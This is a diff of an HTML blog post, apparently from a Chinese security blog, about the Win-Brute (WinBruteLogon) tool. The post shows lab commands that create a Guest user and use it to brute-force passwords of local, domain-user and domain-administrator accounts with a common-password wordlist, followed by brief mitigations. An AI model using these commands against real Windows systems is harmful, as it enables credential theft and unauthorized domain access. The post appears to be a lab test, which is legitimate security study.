@@ -3,7 +3,7 @@
         <head>
         <meta name="viewport" content="width=device-width,minimum-scale=1,maximum-scale=1,initial-scale=1,user-scalable=no" />
         <meta charset="utf-8">
-        <title>Passive IAST | 老白</title>
+        <title>Win-Brute | 老白</title>
         <link rel="stylesheet" href="https://V-alkoinen.github.io/styles/main.css">
         <link rel="stylesheet" href="https://at.alicdn.com/t/font_1306644_jwtuc2zzbrd.css">
         <link href="https://cdn.bootcss.com/animate.css/3.7.2/animate.min.css" rel="stylesheet">
@@ -49,18 +49,49 @@
                 <div class="mdui-row">
                         <div class="mdui-col-md-8 mdui-col-offset-md-2 ">
                                 <article class="mdui-p-a-2 post animated fadeIn" style="animation-delay: 0.8s;animation-duration: 2s">
-                                    <div class="post-title  mdui-m-b-1">Passive IAST</div>
-                                    <div class="mdui-typo-body-2 mdui-m-b-2" datetime="2021-05-12 15:45:03">2021-05-12 / 1 min read</div>
-                                    <div class="mdui-m-b-2 mdui-typo post-neirong"><p><a href="http://rui0.cn/archives/1175">http://rui0.cn/archives/1175</a></p>
+                                    <div class="post-title  mdui-m-b-1">Win-Brute</div>
+                                    <div class="mdui-typo-body-2 mdui-m-b-2" datetime="2022-03-01 22:20:54">2022-03-01 / 2 min read</div>
+                                    <div class="mdui-m-b-2 mdui-typo post-neirong"><h1 id="一-项目地址">一、项目地址</h1>
+<p>  <a href="https://github.com/DarkCoderSc/win-brute-logon">https://github.com/DarkCoderSc/win-brute-logon</a></p>
+<h1 id="二-测试环境">二、测试环境</h1>
+<p>  windows 10（1903）<br>
+  windows server 2016（domain：laobai.com）</p>
+<h1 id="三-工具用法">三、工具用法</h1>
+<p> <code>WinBruteLogon.exe -u &lt;username&gt; -w &lt;wordlist_file&gt;</code><br>
+<img src="https://V-alkoinen.github.io/post-images/1646490875505.png" alt="" loading="lazy"></p>
+<h1 id="四-介绍">四、介绍</h1>
+<p>  该 POC 利用的是 <code>Microsoft Windows</code> 身份验证机制中的一个严重缺点，并不是一个漏洞。<br>
+  实际上，通过访客用户（Guest）即可爆破所有本地用户、域内用户的密码。可以参考<code>net user</code>、<code>net user /domain</code>。</p>
+<h1 id="五-测试">五、测试</h1>
+<p>  Windows 10（PC）：Guest、ljl_s（本地管理员）、user1（域用户）<br>
+  Windows Server 2016（DC）：administrator（域管）</p>
+<pre><code>net user GuestUser !QAZ2wsx /add
+net localgroup users GuestUser /delete
+net localgroup guests GuestUser /add
+</code></pre>
+<p>  使用GuestUser爆破本地管理员密码<br>
+  <code>WinBruteLogon.exe -v -d PC1 -u ljl_s -w 1.txt</code><br>
+<img src="https://V-alkoinen.github.io/post-images/1646492698000.png" alt="" loading="lazy"><br>
+  使用GuestUser爆破域用户密码<br>
+  <code>WinBruteLogon.exe -v -d laobai.com -u user1 -w 1.txt</code><br>
+<img src="https://V-alkoinen.github.io/post-images/1646492769577.png" alt="" loading="lazy"><br>
+  使用GuestUser爆破域管密码<br>
+  <code>WinBruteLogon.exe -v -d laobai.com -u administrator -w 1.txt</code><br>
+<img src="https://V-alkoinen.github.io/post-images/1646492804408.png" alt="" loading="lazy"><br>
+  附赠一个大佬的字典：<a href="https://github.com/danielmiessler/SecLists/blob/master/Passwords/Common-Credentials/10k-most-common.txt">https://github.com/danielmiessler/SecLists/blob/master/Passwords/Common-Credentials/10k-most-common.txt</a></p>
+<h1 id="修复方案">修复方案</h1>
+<p> 因该问题并不是一个有效的漏洞，所以我们只能做一些缓解措施：<br>
+  1、禁用访客用户；<br>
+  2、设置高强度密码。</p>
 </div>
                                     <div class="mdui-divider mdui-m-b-2"></div>
                                     <div class="mdui-row-xs-2 post-fenye">
                                        
-                                        <div class="mdui-col"> <div class="mdui-text-left"><a href="https://V-alkoinen.github.io/post/ipcdollar/">IPC$</a></div></div>
+                                        <div class="mdui-col"> </div>
                                         
 
                                         
-                                        <div class="mdui-col"><div class="mdui-text-right "><a href="https://V-alkoinen.github.io/post/spring-boot-actuator-wei-shou-quan-fang-wen/">Spring Boot Actuator 未授权访问</a></div> </div>
+                                        <div class="mdui-col"><div class="mdui-text-right "><a href="https://V-alkoinen.github.io/post/vulnstack-2/">vulnstack 2</a></div> </div>
                                        
                                       </div>
                                    
